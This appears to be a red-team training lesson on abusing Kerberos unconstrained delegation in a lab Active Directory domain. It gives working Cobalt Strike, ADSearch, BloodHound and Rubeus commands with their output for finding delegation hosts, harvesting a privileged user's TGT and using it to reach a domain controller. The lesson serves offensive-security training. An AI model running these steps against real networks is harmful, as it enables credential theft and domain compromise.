Delegation allows a user or a service to act on behalf of another user to another service. A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as user.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/unconstrained.png)

  

We understand how a user performs Kerberos authentication to the Web Server. But how can the Web Server authenticate to the DB and perform actions as the user? Unconstrained Delegation was the first solution to this problem.

If unconstrained delegation is configured on a computer, the KDC also includes a copy of the user’s TGT inside the TGS. In this example, when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory.

When the Web Server needs to access the DB Server on behalf of that user, it uses the user’s TGT to request a TGS for the database service.

An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.

If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] samaccountname     : DC-2$
    [+] dnshostname        : dc-2.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter

    [+] samaccountname     : SRV-1$
    [+] dnshostname        : srv-1.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter
```

  

In BloodHound:

```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

  

Domain Controllers always have unconstrained delegation configured by default and doesn't exactly represent a good privilege escalation scenario (if you've compromised a DC, you're already a Domain Admin). Other servers are good targets, such as **SRV-1** here.

If we compromise SRV-1 and wait or engineer a privileged user to interact with it, we can steal their cached TGT. Interaction can be any Kerberos service, so something as simple as `dir \\srv-1\c$` is enough.

Rubeus has a `monitor` command (requires elevation) that will continuously look for and extract new TGTs. On SRV-1:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10

[*] Action: TGT Monitoring
[*] Target user     : nlamb
[*] Monitoring every 10 seconds for new TGTs
```

  

Access the console of **WKSTN-2** and do `dir \\srv-1\c$` as nlamb.

```
[*] 3/9/2021 11:33:52 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 11:32:10 AM
  EndTime               :  3/9/2021 9:32:10 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZz [...snip...] 5JTw==

[*] Ticket cache size: 1
```

To stop Rubeus, use Cobalt Strike `jobs` and `jobkill` commands.

Write the base64 decoded string to a `.kirbi` file on your attacking machine. Create a sacrificial logon session, pass the TGT into it and access the domain controller.

```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```
